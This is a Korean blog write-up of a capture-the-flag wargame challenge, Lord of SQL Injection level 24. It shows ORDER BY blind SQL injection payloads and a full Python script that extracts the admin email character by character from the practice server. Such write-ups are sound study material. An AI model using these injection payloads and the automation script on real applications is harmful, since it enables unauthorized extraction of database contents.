---
title: LOS - 24번 evil_wizard
category: Lord of SQL Injection
---

# [24] evil_wizard

## 문제

<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FCPYrT%2FbtrocdvYsid%2FzK4XYNKw6I4J3h0KHsSM91%2Fimg.png">

## 풀이

소스 코드만 보면 이전 문제와 완전히 같다.

물론 같은 문제일리가 없으니 테이블 내부 데이터를 확인해본다.

<br>

다음은 order=1을 페이로드로 전달했을 때 볼 수 있는 테이블이다.


<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FzuOin%2FbtrobVbqsuX%2FD1PiXYZI0jjLsIzxh6LbNk%2Fimg.png">


이번 문제는 id ASC로 정렬해도, score ASC로 정렬해도 그 결과가 같을 것임을 예상할 수 있다.

<br>

그렇다면 이번에는,<br>

if 조건문의 참/거짓에 따라 각각 "1 ASC"와 "1 DESC"를 반환해주면 될 것 같다.

<br>

그렇게 해주면 if문의 조건이 참인 경우,<br>

admin 레코드가 위로 올라가게 되며, 이 경우 res.text에는 **50&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;rubiya** 가 포함될 것이다.

<br>

따라서, 전달해줄 페이로드는 다음과 같다.

<br>

[1] pw 길이 찾기

```
?order=if(id='admin' and length(email)=[길이], '1 ASC', '1 DESC')
```


[2] 완전한 pw 찾기

```  
?order=if(id='admin' and ascii(substr(email,{len},1))=[아스키], '1 ASC', '1 DESC')
```


[3] 참 판별

```
if("50</td></tr><tr><td>rubiya" in res.text)
```

<br>


**LoS 24번 Python 자동화 코드**이다.
```python
import requests

def send(param):
    url = "https://los.rubiya.kr/chall/evil_wizard_32e3d35835aa4e039348712fb75169ad.php"
    cookie = "tp0ja8gkvp5j75fm5lntqomope"
    head = {"PHPSESSID":f"{cookie}"}
    my_url = url+param
    res = requests.get(my_url, cookies=head)
    return res.text

print("💘 LoS 24를 시작합니다")

for num in range(0,100):
    param=f"?order=if(id='admin' and length(email)={num}, '1 ASC', '1 DESC')"
    if("50</td></tr><tr><td>rubiya" in send(param)):
        print(f"👏 email의 길이는 {num}입니다!")
        break

ans=""

for len in range(1, num+1):
    start = 32
    end = 127
    while True:
        middle = round((start+end)/2)
        param=f"?order=if(id='admin' and ascii(substr(email,{len},1))>={middle}, '1 ASC', '1 DESC') %23"
        if("50</td></tr><tr><td>rubiya" in send(param)):
            param=f"?order=if(id='admin' and ascii(substr(email,{len},1))={middle}, '1 ASC', '1 DESC') %23"
            if("50</td></tr><tr><td>rubiya" in send(param)):
                print(f"{len}번째 문자 → {chr(middle)}")
                ans+=chr(middle)
                break
            else:
                start = middle
                continue
        else:
            end = middle
            continue

print(f"👏 email의 정체는 [{ans}]입니다!")
```
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FlPVPv%2FbtrobTraaKg%2FQ8ClrhC9pPGBea0pOv6n0K%2Fimg.png">
  
Blind 공격 결과, admin의 email은 `aasup3r_secure_email@emai1.com` 임을 알 수 있다.
  
## 결과

<img  src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FFRzmL%2Fbtrob7Qa1Vp%2FcNk6I956Im1KcsZugbp5E1%2Fimg.png">